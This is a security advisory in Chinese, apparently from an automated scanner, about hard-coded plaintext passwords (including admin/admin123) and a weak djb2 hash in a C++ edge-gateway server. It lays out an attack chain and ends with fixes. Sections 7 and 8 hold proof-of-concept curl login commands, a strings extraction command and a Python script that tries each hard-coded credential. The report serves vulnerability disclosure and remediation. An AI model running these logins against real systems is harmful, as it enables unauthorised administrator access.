# VULN-SEC-CPP-SECRET-AUTH-001: UserStore 构造函数硬编码三组明文密码含管理员账户可被远程直接登录

**严重性**: Critical | **CWE**: CWE-798 (Use of Hard-coded Credentials) | **置信度**: 85/100
**位置**: `src/user_store.cpp:6-10` @ `UserStore::UserStore`
**语言/框架**: C++ / 自定义 HTTP 服务器
**分析类型**: secret
**Source/Sink**: hardcoded_secret → credential_use
**规则/证据来源**: c_cpp.secret.hardcoded / llm

---

## 1. 漏洞细节

`UserStore` 类的构造函数（`src/user_store.cpp:6-10`）在初始化时硬编码了三组用户凭证，密码以明文字符串字面量的形式直接写入源代码：

| 用户名   | 密码         | 管理员权限 |
| -------- | ------------ | ---------- |
| alice    | wonderland   | 否         |
| operator | op-password  | 否         |
| admin    | admin123     | **是**     |

这些密码字符串在编译时被嵌入二进制文件的数据段（`.rodata`），任何能够获取二进制文件的人都可以通过 `strings` 命令或反汇编工具直接提取出明文密码。即使代码使用了 `weakHash()` 对密码进行哈希存储，但该哈希函数基于 djb2 算法（一种非加密哈希），输出为纯数字字符串，极易被暴力碰撞或彩虹表逆向。

更严重的是，`admin` 账户拥有管理员权限（`admin=true`），且系统通过 `POST /login` 端点（`main.cpp:40`）对外暴露认证接口，该端点绑定在 `INADDR_ANY`（`http_server.cpp:92`），监听所有网络接口，无需任何前置认证即可访问。

系统中不存在任何外部凭证管理机制：无环境变量加载、无配置文件读取、无密钥保管库（Vault）集成。密码无法在不重新编译的情况下轮换。

### 证据摘要

- 触发源: hardcoded_secret — 三组密码以字符串字面量硬编码在构造函数中
- 危险点: credential_use — 硬编码凭证被用于网络可达的认证端点
- 已检查的清洗/缓解: 未发现任何外部凭证管理、环境变量加载或配置文件集成
- 关键证据:
  - `user_store.cpp:7-9`: 三行赋值语句直接将明文密码传入 `weakHash()`
  - `user_store.cpp:12-18`: `weakHash()` 使用 djb2 非加密哈希，输出为 `std::to_string(value)`
  - `main.cpp:30`: `UserStore users;` 在 `main()` 中无条件实例化，硬编码凭证必然加载
  - `main.cpp:40-52`: `POST /login` 端点直接调用 `users.authenticate()`，无额外访问控制
  - `http_server.cpp:92`: `address.sin_addr.s_addr = INADDR_ANY` 监听所有网络接口

## 2. 漏洞代码

**文件**: `src/user_store.cpp` (行 6-10)

```cpp
UserStore::UserStore() {
  users_["alice"] = {"alice", weakHash("wonderland"), false};      // ← 硬编码密码 #1
  users_["operator"] = {"operator", weakHash("op-password"), false}; // ← 硬编码密码 #2
  users_["admin"] = {"admin", weakHash("admin123"), true};          // ← 硬编码密码 #3 (管理员!)
}
```

**弱哈希函数** — `src/user_store.cpp` (行 12-18):

```cpp
std::string UserStore::weakHash(const std::string& password) const {
  unsigned int value = 5381;
  for (char ch : password) {
    value = ((value << 5) + value) + static_cast<unsigned char>(ch);
  }
  return std::to_string(value);  // ← 非加密哈希，输出为数字字符串
}
```

**认证逻辑** — `src/user_store.cpp` (行 20-26):

```cpp
bool UserStore::authenticate(const std::string& username, const std::string& password) const {
  auto user = users_.find(username);
  if (user == users_.end()) {
    return false;
  }
  return user->second.passwordHash == weakHash(password);  // ← 对比 djb2 哈希值
}
```

**登录入口** — `src/main.cpp` (行 40-52):

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
  std::string username = queryValue(request, "user");      // ← 从查询参数获取用户名
  std::string password = queryValue(request, "password");   // ← 从查询参数获取密码
  audit.event(username, "login-attempt", request.body);

  if (!users.authenticate(username, password)) {            // ← 调用认证函数
    return text(401, "invalid credentials\n");
  }

  std::string token = users.issueSession(username);         // ← 认证成功，签发会话
  audit.event(username, "login-success", token);
  return text(200, "session=" + token + "\n");
});
```

**代码分析**:

1. **第 7-9 行**（漏洞根因）：三个用户账户的密码以 C++ 字符串字面量形式硬编码。编译器会将 `"wonderland"`、`"op-password"`、`"admin123"` 直接放入二进制文件的只读数据段。
2. **第 12-18 行**（加剧因素）：`weakHash()` 使用 djb2 算法，该算法设计目的是快速字符串哈希（用于哈希表），不具备抗碰撞性和单向性。输出通过 `std::to_string()` 转为十进制数字字符串，搜索空间极小（32 位无符号整数 ≈ 42 亿种可能），可在秒级完成暴力破解。
3. **第 40-52 行**（攻击面）：`POST /login` 端点接受来自网络的认证请求，无任何速率限制、IP 白名单或前置认证要求。

## 3. 完整攻击链路

```
[入口点] POST /login (query: user, password)
    @ main.cpp:40 — 绑定 INADDR_ANY，所有网络接口可达
    ↓ HTTP 查询参数 user/password 被 queryValue() 提取 (main.cpp:41-42)
[认证调用] users.authenticate(username, password)
    @ main.cpp:45 — 直接传入用户提供的凭证
    ↓ 调用 UserStore::authenticate() (user_store.cpp:20)
[哈希比对] user->second.passwordHash == weakHash(password)
    @ user_store.cpp:25 — 将用户输入经 djb2 哈希后与存储值比较
    ↓ 存储的 passwordHash 来自构造函数中的硬编码明文
[凭证来源] weakHash("admin123") / weakHash("wonderland") / weakHash("op-password")
    @ user_store.cpp:7-9 — 明文密码编译进二进制
    ↓ 攻击者通过 strings 命令或源码审查获取明文密码
[漏洞触发] 攻击者使用 admin/admin123 成功登录，获取管理员会话令牌
```

### 攻击链路详细说明

**步骤 1 — 凭证获取**：攻击者通过以下任一方式获取硬编码密码：
- 获取二进制文件后执行 `strings binary | grep -i admin` 或类似命令
- 获取源代码后直接阅读 `user_store.cpp:7-9`
- 逆向工程二进制文件，在 `.rodata` 段找到字符串字面量

**步骤 2 — 远程认证**：攻击者向服务器发送 HTTP 请求 `POST /login?user=admin&password=admin123`。

**步骤 3 — 认证通过**：`authenticate()` 函数计算 `weakHash("admin123")` 并与存储的哈希值匹配，返回 `true`。

**步骤 4 — 获取管理员会话**：`issueSession("admin")` 生成会话令牌并返回给攻击者，攻击者获得管理员权限。

## 4. 攻击场景

**攻击者画像**: 任何能够访问服务端口（默认 8080）的远程未认证攻击者。攻击者无需任何先验权限，只需能够发送 HTTP 请求。如果攻击者还能获取二进制文件或源代码（如通过泄露的代码仓库、共享的二进制发布包），则可直接提取所有凭证。

**攻击向量**: 网络 HTTP 请求 — 通过 `POST /login` 端点使用已知的硬编码凭证进行认证。

**利用难度**: **低** — 硬编码密码为简单字符串（如 `admin123`），无需任何特殊技术即可利用。即使不知道密码，djb2 哈希也可在秒级被暴力破解。

### 攻击步骤

1. **信息收集**：攻击者发现目标运行 edge-gateway 服务（端口 8080），通过 `strings` 命令或源码审查获取硬编码凭证 `admin/admin123`。
2. **发送登录请求**：向 `POST /login?user=admin&password=admin123` 发送 HTTP 请求。
3. **获取会话令牌**：服务器返回 `session=sess-admin-{timestamp}` 格式的会话令牌。
4. **利用管理员权限**：使用获取的管理员身份访问受保护资源（如 `/admin/export` 端点）。
5. **横向扩展**：由于凭证无法轮换，攻击者可长期维持访问权限，且所有部署实例共享相同凭证。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                       |
| ---------- | -------------- | ------------------------------------------------------------------------------------------ |
| 网络可达性 | TCP 端口可达   | 服务器默认监听 8080 端口，绑定 `INADDR_ANY`（所有网络接口），攻击者需能访问该端口           |
| 认证要求   | 无需前置认证   | `/login` 端点对外公开，无需任何预认证即可发送登录请求                                       |
| 配置依赖   | 无特殊配置要求 | 硬编码凭证在构造函数中无条件加载，不依赖任何配置开关或运行模式                               |
| 环境依赖   | 无特殊要求     | 凭证编译进二进制文件，所有平台、所有编译选项下均存在该漏洞                                   |
| 时序条件   | 无             | 凭证在服务启动时即加载，全生命周期有效，不存在竞态条件                                       |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                                     |
| -------- | ---- | -------------------------------------------------------------------------------------------------------- |
| 机密性   | **高** | 攻击者可冒充任何用户（包括管理员）登录系统，访问受保护数据；硬编码凭证本身即为敏感信息泄露               |
| 完整性   | **高** | 获取管理员权限后可篡改系统数据、修改配置；管理员账户可用于访问 `/admin/export` 等管理端点                 |
| 可用性   | **中** | 攻击者可利用管理员权限干扰正常服务运行；凭证无法远程轮换，修复需要重新编译和部署                          |

**影响范围**: **全局影响** — 所有部署实例共享相同的硬编码凭证。一旦凭证泄露（通过源码泄露、二进制分发或逆向工程），所有运行该软件的服务器均面临被入侵风险。由于凭证无法在不重新编译的情况下轮换，修复周期长，窗口期大。

**复合风险**: 硬编码的管理员凭证与弱哈希函数（djb2）相结合，使得即使攻击者只能获取哈希值（如通过内存转储），也可在极短时间内逆向出原始密码。此外，`issueSession()` 函数（`user_store.cpp:33-36`）生成的会话令牌仅包含用户名和时间戳，可预测性强，进一步降低了攻击门槛。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，请勿用于非法目的。

### PoC 1: 使用硬编码管理员凭证直接登录

```bash
# 假设目标服务运行在 localhost:8080
# 使用硬编码的管理员凭证 admin/admin123 登录

curl -v -X POST "http://TARGET_HOST:8080/login?user=admin&password=admin123"
```

**预期响应**:
```
HTTP/1.1 200 OK
Content-Type: text/plain

session=sess-admin-1750000000
```

### PoC 2: 从二进制文件提取硬编码凭证

```bash
# 从编译后的二进制文件中提取硬编码的密码字符串
strings ./edge-gateway | grep -E "wonderland|op-password|admin123"

# 预期输出:
# wonderland
# op-password
# admin123
```

### PoC 3: 批量验证所有硬编码账户

```python
#!/usr/bin/env python3
"""
仅供安全测试使用 — 验证硬编码凭证漏洞
"""
import urllib.request
import urllib.parse

TARGET = "http://localhost:8080"

# 从源码/二进制中提取的硬编码凭证
credentials = [
    ("alice",    "wonderland"),
    ("operator", "op-password"),
    ("admin",    "admin123"),
]

for user, password in credentials:
    params = urllib.parse.urlencode({"user": user, "password": password})
    url = f"{TARGET}/login?{params}"
    req = urllib.request.Request(url, method="POST")
    try:
        resp = urllib.request.urlopen(req)
        body = resp.read().decode()
        print(f"[+] 登录成功: {user}/{password} => {body.strip()}")
    except urllib.error.HTTPError as e:
        print(f"[-] 登录失败: {user}/{password} => HTTP {e.code}")
```

**使用说明**:

1. 确保目标 edge-gateway 服务正在运行（默认端口 8080）
2. 执行 PoC 1 的 curl 命令，验证管理员凭证有效
3. 执行 PoC 2 的 strings 命令，验证密码可从二进制中提取
4. 执行 PoC 3 的 Python 脚本，批量验证所有硬编码账户

**预期结果**:

- PoC 1: 返回 HTTP 200 和有效的管理员会话令牌
- PoC 2: `strings` 输出中包含 `wonderland`、`op-password`、`admin123` 三个明文密码
- PoC 3: 三组凭证全部登录成功，返回各自的会话令牌

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ 或其他主流发行版)
- 编译器: GCC 9+ 或 Clang 10+（支持 C++17）
- 构建工具: CMake 3.16+ 或 Make
- 依赖: 仅标准 C++ 库和 POSIX socket API，无外部依赖

### 构建步骤

```bash
# 在项目根目录下编译
cd /scan/project
g++ -std=c++17 -O0 -g \
  -I include/ \
  src/main.cpp src/user_store.cpp src/file_cache.cpp \
  src/diagnostics.cpp src/http_server.cpp \
  -o edge-gateway
```

### 运行配置

```bash
# 启动服务（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

无需额外配置文件或环境变量 — 所有凭证硬编码在源码中。

### 验证步骤

1. 编译并启动 edge-gateway 服务
2. 使用 `strings ./edge-gateway | grep -E "wonderland|op-password|admin123"` 验证密码存在于二进制中
3. 使用 `curl -X POST "http://localhost:8080/login?user=admin&password=admin123"` 发送登录请求
4. 确认返回 HTTP 200 和会话令牌
5. 使用错误密码测试：`curl -X POST "http://localhost:8080/login?user=admin&password=wrong"` 确认返回 HTTP 401

### 预期结果

- 步骤 2: `strings` 命令输出三个明文密码字符串
- 步骤 3-4: 使用硬编码凭证成功登录，返回 `session=sess-admin-{timestamp}`
- 步骤 5: 使用错误密码时正确返回 401，证明认证逻辑正常工作，硬编码凭证确实有效

---

## 9. 修复建议

1. **立即措施**: 从源代码中移除所有硬编码密码，改用环境变量或外部配置文件加载凭证
2. **凭证管理**: 集成密钥保管库（如 HashiCorp Vault、AWS Secrets Manager）管理用户凭证
3. **哈希算法**: 将 djb2 替换为密码学安全的哈希算法（如 bcrypt、scrypt 或 Argon2id）
4. **密码策略**: 强制用户设置强密码，实施密码复杂度要求
5. **会话管理**: 改进 `issueSession()` 使用加密安全的随机令牌（如 UUID v4 或 HMAC-signed JWT）
6. **速率限制**: 在 `/login` 端点添加登录速率限制，防止暴力破解
7. **凭证轮换**: 建立定期凭证轮换机制，确保泄露后可快速响应
